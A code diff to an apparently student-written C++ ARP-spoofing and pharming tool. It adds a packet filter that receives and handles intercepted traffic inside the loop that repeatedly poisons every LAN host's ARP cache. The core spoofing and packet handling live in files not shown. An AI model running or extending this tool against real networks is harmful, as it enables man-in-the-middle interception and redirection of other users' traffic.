@@ -22,6 +22,7 @@
 #include "arp.h"
 #include "scan.h"
 #include "spoof.h"
+#include "filter.h"
 #include "pharm_attack.h"
 
 /**
@@ -29,9 +30,16 @@
  * @param gateway_ip the ip address of gateway in std::string
  * @param answered_list the list of all the hosts in the local area network
  * @param spoof_operator the spoof operator
+ * @param filter_operator the filter operator
  */
-void arp_spoofing(std::string gateway_ip, std::vector<std::pair<std::string, std::string>> answered_list, SpoofOperator *spoof_operator) {
+void arp_spoofing(std::string gateway_ip, 
+        std::vector<std::pair<std::string, std::string>> answered_list,
+        SpoofOperator *spoof_operator, FilterOperator *filter_operator)
+{
     // run for 100 iterations
+    int nbytes;
+    filter_operator->set_timeout(1, 0);
+
     for (int t = 0; t < 100; t++) {
         std::cout << "spoofing iteration: " << t << std::endl;
         for (auto i = 0; i < answered_list.size(); i++) {
@@ -40,6 +48,21 @@ void arp_spoofing(std::string gateway_ip, std::vector<std::pair<std::string, std
                 spoof_operator->attack(gateway_ip, answered_list[i].first);
             }
         }
+        while (true) {
+            nbytes = filter_operator->receive();
+            if (nbytes < 0) {
+                if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                    // timeout
+                    break;
+                } else {
+                    perror("filter_operator->recv() failed");
+                    exit(EXIT_FAILURE);
+                }
+            } else {
+                filter_operator->handle_packet(nbytes);
+            }
+        }
+        // process data
         sleep(2);
     }
 }
@@ -125,10 +148,12 @@ int main()
         exit(EXIT_FAILURE);
     }
 
+    FilterOperator filter_operator;
+
     arp_operator.prepare_unicast();
     arp_operator.prepare_header_values();
 
-    arp_spoofing(gateway_ip, answered_list, &spoof_operator);
+    arp_spoofing(gateway_ip, answered_list, &spoof_operator, &filter_operator);
 
     return 0;
 }
